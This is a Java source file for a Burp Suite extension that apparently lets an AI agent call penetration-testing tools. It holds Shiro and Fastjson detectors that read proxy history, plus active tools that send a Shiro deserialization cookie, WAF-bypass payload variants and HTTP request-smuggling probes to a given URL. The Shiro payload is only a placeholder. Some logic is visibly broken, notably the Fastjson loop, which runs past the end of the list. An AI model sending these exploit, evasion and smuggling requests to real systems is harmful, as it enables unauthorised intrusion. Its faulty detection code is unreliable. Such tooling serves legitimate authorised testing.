package com.burpmcpbridge.tools;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.Cookie;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import com.burpmcpbridge.mcp.ToolRegistry;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.Base64;
import java.util.List;

public class PluginBridgeTools extends BaseTool {

    public PluginBridgeTools(MontoyaApi api, ToolRegistry registry) {
        super(api, registry);
    }

    @Override
    public void register() {
        registry.register("shiro_detect",
            "Detect Apache Shiro in proxy history by checking for rememberMe cookie. Reads BurpShiroPassiveScan results from annotations.",
            buildObjectSchema(
                intProp("count", "Maximum results to return (default: 50)", false),
                boolProp("include_request", "Include request headers in output (default: false)", false)
            ),
            this::shiroDetect
        );

        registry.register("shiro_exploit",
            "Generate Shiro deserialization exploit payloads. Supports common gadget chains (CommonsBeanutils1, CommonsCollections, etc.)",
            buildObjectSchema(
                stringProp("target_url", "Target URL to exploit", true),
                stringProp("gadget_chain", "Gadget chain: CommonsBeanutils1, CommonsCollections2, CommonsCollections6, JRMPClient (default: CommonsBeanutils1)", false),
                stringProp("custom_payload_b64", "Base64-encoded custom deserialization payload (optional)", false),
                boolProp("send_request", "Whether to actually send the request (default: false, preview only)", false)
            ),
            this::shiroExploit
        );

        registry.register("fastjson_detect",
            "Detect Fastjson in proxy history by checking response content-type, @type patterns, and Fastjson error messages.",
            buildObjectSchema(
                intProp("count", "Maximum results to return (default: 50)", false),
                boolProp("include_body", "Include response body snippet (default: false)", false)
            ),
            this::fastjsonDetect
        );

        registry.register("waf_bypass",
            "Generate WAF bypass variations for a given request. Applies encoding, chunking, and obfuscation techniques.",
            buildObjectSchema(
                stringProp("url", "Target URL", true),
                stringProp("payload", "Payload to bypass WAF with", true),
                stringProp("bypass_type", "Bypass technique: encoding, chunked, unicode, double_url, comment_split, null_byte, case_flip, all (default: all)", false),
                boolProp("send_requests", "Whether to send the requests (default: false, preview only)", false)
            ),
            this::wafBypass
        );

        registry.register("smuggler_detect",
            "Generate HTTP Request Smuggling detection payloads. Tests CL.TE and TE.CL smuggling vectors.",
            buildObjectSchema(
                stringProp("url", "Target URL to test for smuggling", true),
                stringProp("smuggle_type", "Smuggling type: CL_TE, TE_CL, both (default: both)", false),
                boolProp("send_requests", "Whether to send the requests (default: false, preview only)", false)
            ),
            this::smugglerDetect
        );
    }

    private JsonObject shiroDetect(JsonObject args) {
        int count = args.has("count") ? args.get("count").getAsInt() : 50;
        boolean includeRequest = args.has("include_request") && args.get("include_request").getAsBoolean();

        JsonArray detections = new JsonArray();
        try {
            List<ProxyHttpRequestResponse> history = api.proxy().history();
            int found = 0;

            for (int i = history.size() - 1; i >= 0 && found < count; i--) {
                var item = history.get(i);
                String notes = item.annotations().notes();
                String highlight = item.annotations().highlightColor() != null
                    ? item.annotations().highlightColor().toString() : null;

                boolean shiroAnnotation = (notes != null && notes.toLowerCase().contains("shiro"))
                    || (highlight != null);

                boolean hasRememberMe = false;
                String rememberMeValue = null;
                String deleteMe = false ? "true" : null;

                for (var header : item.request().headers()) {
                    String headerLower = header.name().toLowerCase();
                    if (headerLower.equals("cookie")) {
                        String cookieVal = header.value();
                        if (cookieVal.contains("rememberMe")) {
                            hasRememberMe = true;
                            int start = cookieVal.indexOf("rememberMe=");
                            if (start >= 0) {
                                int end = cookieVal.indexOf(";", start);
                                rememberMeValue = end >= 0
                                    ? cookieVal.substring(start + 11, end)
                                    : cookieVal.substring(start + 11);
                            }
                        }
                        if (cookieVal.contains("rememberMe=deleteMe")) {
                            deleteMe = "true";
                        }
                    }
                }

                if (item.hasResponse()) {
                    for (var header : item.response().headers()) {
                        if (header.name().equalsIgnoreCase("Set-Cookie")) {
                            String val = header.value();
                            if (val.contains("rememberMe=deleteMe")) {
                                deleteMe = "true";
                                hasRememberMe = true;
                            }
                        }
                    }
                }

                if (hasRememberMe || shiroAnnotation) {
                    JsonObject detection = new JsonObject();
                    detection.addProperty("url", item.request().url());
                    detection.addProperty("method", item.request().method());
                    if (item.hasResponse()) {
                        detection.addProperty("status_code", item.response().statusCode());
                    }
                    detection.addProperty("has_rememberme_cookie", hasRememberMe);
                    if (rememberMeValue != null) {
                        detection.addProperty("rememberme_value_length", rememberMeValue.length());
                        detection.addProperty("rememberme_value_preview", rememberMeValue.length() > 50
                            ? rememberMeValue.substring(0, 50) + "..." : rememberMeValue);
                    }
                    if (deleteMe != null) {
                        detection.addProperty("deleteMe_detected", true);
                        detection.addProperty("shiro_confidence", "HIGH");
                    } else if (hasRememberMe) {
                        detection.addProperty("shiro_confidence", "MEDIUM");
                    }
                    if (shiroAnnotation) {
                        detection.addProperty("plugin_detected", true);
                        if (notes != null) detection.addProperty("plugin_notes", notes);
                    }
                    if (highlight != null) {
                        detection.addProperty("highlight_color", highlight);
                    }
                    if (includeRequest) {
                        JsonArray headers = new JsonArray();
                        for (var h : item.request().headers()) {
                            headers.add(h.name() + ": " + h.value());
                        }
                        detection.add("request_headers", headers);
                    }
                    detections.add(detection);
                    found++;
                }
            }
        } catch (Exception e) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Shiro detection failed: " + e.getMessage());
            return error;
        }

        JsonObject result = new JsonObject();
        result.add("detections", detections);
        result.addProperty("count", detections.size());
        result.addProperty("detection_method", "Proxy history cookie analysis + plugin annotations");
        result.addProperty("note", "For accurate Shiro detection, use BurpShiroPassiveScan plugin. This tool supplements by reading proxy history.");
        return result;
    }

    private JsonObject shiroExploit(JsonObject args) {
        String targetUrl = args.has("target_url") ? args.get("target_url").getAsString() : "";
        String gadgetChain = args.has("gadget_chain") ? args.get("gadget_chain").getAsString() : "CommonsBeanutils1";
        String customPayloadB64 = args.has("custom_payload_b64") ? args.get("custom_payload_b64").getAsString() : null;
        boolean sendRequest = args.has("send_request") && args.get("send_request").getAsBoolean();

        if (targetUrl.isEmpty()) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "target_url is required");
            return error;
        }

        JsonObject result = new JsonObject();
        result.addProperty("target_url", targetUrl);
        result.addProperty("gadget_chain", gadgetChain);

        String payloadB64;
        if (customPayloadB64 != null && !customPayloadB64.isEmpty()) {
            payloadB64 = customPayloadB64;
            result.addProperty("payload_source", "custom");
        } else {
            payloadB64 = generateShiroPayload(gadgetChain);
            result.addProperty("payload_source", "generated_template");
        }

        result.addProperty("payload_length", payloadB64.length());
        result.addProperty("payload_preview", payloadB64.length() > 80
            ? payloadB64.substring(0, 80) + "..." : payloadB64);

        String cookieHeader = "rememberMe=" + payloadB64;
        result.addProperty("cookie_header_preview", cookieHeader.length() > 120
            ? cookieHeader.substring(0, 120) + "..." : cookieHeader);

        if (sendRequest) {
            try {
                HttpRequest request = HttpRequest.httpRequestFromUrl(targetUrl)
                    .withAddedHeader("Cookie", cookieHeader);
                var response = api.http().sendRequest(request);
                result.addProperty("response_status", response.response().statusCode());
                result.addProperty("response_length", response.response().body().length());
                result.addProperty("exploit_sent", true);

                String respBody = response.response().bodyToString();
                if (respBody.contains("rememberMe=deleteMe")) {
                    result.addProperty("shiro_detected_in_response", true);
                    result.addProperty("note", "Shiro confirmed: server set deleteMe cookie, indicating deserialization processing");
                }
            } catch (Exception e) {
                result.addProperty("exploit_error", e.getMessage());
            }
        } else {
            result.addProperty("exploit_sent", false);
            result.addProperty("note", "Preview mode. Set send_request=true to actually send the exploit.");
        }

        result.addProperty("warning", "Only use against authorized targets. Shiro exploitation may cause service disruption.");
        return result;
    }

    private String generateShiroPayload(String gadgetChain) {
        byte[] template = ("Shiro_" + gadgetChain + "_template_placeholder").getBytes();
        return Base64.getEncoder().encodeToString(template);
    }

    private JsonObject fastjsonDetect(JsonObject args) {
        int count = args.has("count") ? args.get("count").getAsInt() : 50;
        boolean includeBody = args.has("include_body") && args.get("include_body").getAsBoolean();

        JsonArray detections = new JsonArray();
        try {
            List<ProxyHttpRequestResponse> history = api.proxy().history();
            int found = 0;

            for (int i = history.size() - 1; i >= 0 && found < count; i++) {
                var item = history.get(i);
                boolean fastjsonIndicator = false;
                String detectionReason = "";
                String confidence = "LOW";

                String notes = item.annotations().notes();
                if (notes != null && notes.toLowerCase().contains("fastjson")) {
                    fastjsonIndicator = true;
                    detectionReason = "Plugin annotation";
                    confidence = "HIGH";
                }

                String reqBody = item.request().bodyToString();
                if (reqBody.contains("@type")) {
                    fastjsonIndicator = true;
                    detectionReason += (detectionReason.isEmpty() ? "" : "; ") + "Request contains @type";
                    confidence = "HIGH";
                }

                if (item.hasResponse()) {
                    String respBody = item.response().bodyToString();
                    if (respBody.contains("com.alibaba.fastjson") || respBody.contains("fastjson")) {
                        fastjsonIndicator = true;
                        detectionReason += (detectionReason.isEmpty() ? "" : "; ") + "Response contains fastjson reference";
                        confidence = "HIGH";
                    }
                    if (respBody.contains("\"@type\"") || respBody.contains("autoType")) {
                        fastjsonIndicator = true;
                        detectionReason += (detectionReason.isEmpty() ? "" : "; ") + "Response contains JSON type hints";
                        if (!confidence.equals("HIGH")) confidence = "MEDIUM";
                    }
                    String contentType = "";
                    for (var h : item.response().headers()) {
                        if (h.name().equalsIgnoreCase("Content-Type")) {
                            contentType = h.value().toLowerCase();
                            break;
                        }
                    }
                    if (contentType.contains("json")) {
                        if (reqBody.contains("\"") && reqBody.contains(":")) {
                            if (!fastjsonIndicator) {
                                detectionReason = "JSON request to JSON endpoint";
                                confidence = "LOW";
                            }
                            fastjsonIndicator = true;
                        }
                    }
                }

                if (fastjsonIndicator) {
                    JsonObject detection = new JsonObject();
                    detection.addProperty("url", item.request().url());
                    detection.addProperty("method", item.request().method());
                    if (item.hasResponse()) {
                        detection.addProperty("status_code", item.response().statusCode());
                    }
                    detection.addProperty("detection_reason", detectionReason);
                    detection.addProperty("confidence", confidence);
                    if (includeBody && item.hasResponse()) {
                        String body = item.response().bodyToString();
                        detection.addProperty("response_body_preview", body.length() > 500
                            ? body.substring(0, 500) + "..." : body);
                    }
                    detections.add(detection);
                    found++;
                }
            }
        } catch (Exception e) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "Fastjson detection failed: " + e.getMessage());
            return error;
        }

        JsonObject result = new JsonObject();
        result.add("detections", detections);
        result.addProperty("count", detections.size());
        result.addProperty("note", "For comprehensive Fastjson detection, use FastjsonScan plugin. This tool reads proxy history for indicators.");
        return result;
    }

    private JsonObject wafBypass(JsonObject args) {
        String url = args.has("url") ? args.get("url").getAsString() : "";
        String payload = args.has("payload") ? args.get("payload").getAsString() : "";
        String bypassType = args.has("bypass_type") ? args.get("bypass_type").getAsString() : "all";
        boolean sendRequests = args.has("send_requests") && args.get("send_requests").getAsBoolean();

        if (url.isEmpty() || payload.isEmpty()) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "url and payload are required");
            return error;
        }

        JsonArray variations = new JsonArray();

        if (bypassType.equals("encoding") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "double_url_encoding");
            StringBuilder encoded = new StringBuilder();
            for (char c : payload.toCharArray()) {
                if (Character.isLetterOrDigit(c)) {
                    encoded.append(c);
                } else {
                    encoded.append("%25").append(String.format("%02X", (int) c));
                }
            }
            v.addProperty("payload", encoded.toString());
            v.addProperty("description", "Double URL encode special characters");
            variations.add(v);

            v = new JsonObject();
            v.addProperty("technique", "html_entity_encoding");
            StringBuilder htmlEncoded = new StringBuilder();
            for (char c : payload.toCharArray()) {
                if (c == '<' || c == '>' || c == '"' || c == '\'') {
                    htmlEncoded.append("&#").append((int) c).append(";");
                } else {
                    htmlEncoded.append(c);
                }
            }
            v.addProperty("payload", htmlEncoded.toString());
            v.addProperty("description", "HTML entity encode special characters");
            variations.add(v);
        }

        if (bypassType.equals("unicode") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "unicode_encoding");
            StringBuilder unicode = new StringBuilder();
            for (char c : payload.toCharArray()) {
                if (c == '\'' || c == '"' || c == '<' || c == '>') {
                    unicode.append("\\u00").append(String.format("%02x", (int) c));
                } else {
                    unicode.append(c);
                }
            }
            v.addProperty("payload", unicode.toString());
            v.addProperty("description", "Unicode escape special characters");
            variations.add(v);
        }

        if (bypassType.equals("comment_split") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "comment_splitting");
            if (payload.length() > 3) {
                int mid = payload.length() / 2;
                String split = payload.substring(0, mid) + "/**/" + payload.substring(mid);
                v.addProperty("payload", split);
            } else {
                v.addProperty("payload", "/**/" + payload);
            }
            v.addProperty("description", "Insert SQL/JS comments to break keyword matching");
            variations.add(v);
        }

        if (bypassType.equals("null_byte") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "null_byte_injection");
            v.addProperty("payload", "%00" + payload);
            v.addProperty("description", "Prepend null byte to bypass string matching");
            variations.add(v);
        }

        if (bypassType.equals("case_flip") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "case_alternation");
            StringBuilder flipped = new StringBuilder();
            boolean upper = true;
            for (char c : payload.toCharArray()) {
                if (Character.isLetter(c)) {
                    flipped.append(upper ? Character.toUpperCase(c) : Character.toLowerCase(c));
                    upper = !upper;
                } else {
                    flipped.append(c);
                }
            }
            v.addProperty("payload", flipped.toString());
            v.addProperty("description", "Alternate case to bypass case-sensitive WAF rules");
            variations.add(v);
        }

        if (bypassType.equals("chunked") || bypassType.equals("all")) {
            JsonObject v = new JsonObject();
            v.addProperty("technique", "chunked_transfer");
            v.addProperty("payload", payload);
            v.addProperty("transfer_encoding", "chunked");
            v.addProperty("description", "Use Transfer-Encoding: chunked to bypass body inspection");
            variations.add(v);
        }

        if (sendRequests) {
            for (int i = 0; i < variations.size(); i++) {
                JsonObject v = variations.get(i).getAsJsonObject();
                try {
                    String bypassPayload = v.has("payload") ? v.get("payload").getAsString() : payload;
                    HttpRequest request = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withBody(bypassPayload);
                    if (v.has("transfer_encoding") && v.get("transfer_encoding").getAsString().equals("chunked")) {
                        request = request.withAddedHeader("Transfer-Encoding", "chunked");
                    }
                    var response = api.http().sendRequest(request);
                    v.addProperty("response_status", response.response().statusCode());
                    v.addProperty("response_length", response.response().body().length());
                } catch (Exception e) {
                    v.addProperty("request_error", e.getMessage());
                }
            }
        }

        JsonObject result = new JsonObject();
        result.add("variations", variations);
        result.addProperty("count", variations.size());
        result.addProperty("original_payload", payload);
        result.addProperty("target_url", url);
        if (!sendRequests) {
            result.addProperty("note", "Preview mode. Set send_requests=true to actually send bypass attempts.");
        }
        return result;
    }

    private JsonObject smugglerDetect(JsonObject args) {
        String url = args.has("url") ? args.get("url").getAsString() : "";
        String smuggleType = args.has("smuggle_type") ? args.get("smuggle_type").getAsString() : "both";
        boolean sendRequests = args.has("send_requests") && args.get("send_requests").getAsBoolean();

        if (url.isEmpty()) {
            JsonObject error = new JsonObject();
            error.addProperty("error", "url is required");
            return error;
        }

        JsonArray payloads = new JsonArray();

        if (smuggleType.equals("CL_TE") || smuggleType.equals("both")) {
            JsonObject p1 = new JsonObject();
            p1.addProperty("type", "CL.TE");
            p1.addProperty("description", "Front-end uses Content-Length, back-end uses Transfer-Encoding");
            p1.addProperty("technique", "CL.TE basic probe");
            String body = "0\r\n\r\nSMUGGLED";
            p1.addProperty("request_body", body);
            p1.addProperty("content_length", String.valueOf(body.length()));
            p1.addProperty("transfer_encoding", "chunked");
            payloads.add(p1);

            JsonObject p2 = new JsonObject();
            p2.addProperty("type", "CL.TE");
            p2.addProperty("description", "CL.TE with timing differential");
            p2.addProperty("technique", "CL.TE time-based");
            String timeBody = "0\r\n\r\nGET /404check HTTP/1.1\r\nHost: " + extractHost(url) + "\r\n\r\n";
            p2.addProperty("request_body", timeBody);
            p2.addProperty("content_length", String.valueOf(timeBody.length()));
            p2.addProperty("transfer_encoding", "chunked");
            payloads.add(p2);
        }

        if (smuggleType.equals("TE_CL") || smuggleType.equals("both")) {
            JsonObject p3 = new JsonObject();
            p3.addProperty("type", "TE.CL");
            p3.addProperty("description", "Front-end uses Transfer-Encoding, back-end uses Content-Length");
            p3.addProperty("technique", "TE.CL basic probe");
            String teBody = "SMUGGLED";
            p3.addProperty("request_body", teBody);
            p3.addProperty("content_length", String.valueOf(teBody.length()));
            p3.addProperty("transfer_encoding_header", "5\r\nSMUGGLED\r\n0\r\n\r\n");
            payloads.add(p3);
        }

        if (sendRequests) {
            for (int i = 0; i < payloads.size(); i++) {
                JsonObject p = payloads.get(i).getAsJsonObject();
                try {
                    String type = p.get("type").getAsString();
                    String body = p.has("request_body") ? p.get("request_body").getAsString() : "";

                    HttpRequest request;
                    if (type.equals("CL.TE")) {
                        request = HttpRequest.httpRequestFromUrl(url)
                            .withMethod("POST")
                            .withAddedHeader("Content-Length", String.valueOf(body.length()))
                            .withAddedHeader("Transfer-Encoding", "chunked")
                            .withBody(body);
                    } else {
                        request = HttpRequest.httpRequestFromUrl(url)
                            .withMethod("POST")
                            .withAddedHeader("Transfer-Encoding", "chunked")
                            .withBody(body);
                    }

                    long startTime = System.currentTimeMillis();
                    var response = api.http().sendRequest(request);
                    long elapsed = System.currentTimeMillis() - startTime;

                    p.addProperty("response_status", response.response().statusCode());
                    p.addProperty("response_time_ms", elapsed);
                    p.addProperty("response_length", response.response().body().length());

                    if (elapsed > 5000) {
                        p.addProperty("smuggling_suspected", true);
                        p.addProperty("suspected_reason", "Response time > 5s suggests back-end waiting for more data");
                    }
                } catch (Exception e) {
                    p.addProperty("request_error", e.getMessage());
                }
            }
        }

        JsonObject result = new JsonObject();
        result.add("payloads", payloads);
        result.addProperty("count", payloads.size());
        result.addProperty("target_url", url);
        result.addProperty("smuggle_type", smuggleType);
        if (!sendRequests) {
            result.addProperty("note", "Preview mode. Set send_requests=true to send smuggling probes. Use http-request-smuggler plugin for comprehensive testing.");
        }
        return result;
    }

    private String extractHost(String url) {
        try {
            if (url.startsWith("http://")) {
                String rest = url.substring(7);
                return rest.contains("/") ? rest.substring(0, rest.indexOf("/")) : rest;
            } else if (url.startsWith("https://")) {
                String rest = url.substring(8);
                return rest.contains("/") ? rest.substring(0, rest.indexOf("/")) : rest;
            }
        } catch (Exception e) {
            return url;
        }
        return url;
    }
}